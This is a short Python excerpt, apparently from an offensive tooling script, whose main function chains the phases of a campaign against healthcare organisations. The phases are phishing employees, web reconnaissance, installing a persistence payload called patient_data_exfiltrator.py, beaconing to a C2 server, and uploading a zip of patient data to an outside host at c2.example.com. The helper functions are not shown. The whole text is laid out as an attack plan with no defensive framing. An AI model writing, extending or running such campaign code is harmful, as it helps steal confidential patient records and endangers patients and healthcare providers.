...
def main():
    """
    Main function to run the healthcare_campaign campaign.
    """
    print(f"[*] Starting healthcare_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("healthcare_organizations_employees.txt")
    run_tool("apt_web_recon.js", "--target healthcare_organizations.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/patient_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-HEALTHCARE_ORGANIZATIONS-01")
    ...
    exfiltration.exfiltrate_data("patient_data/patient_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/patient_data_exfiltrator.py")
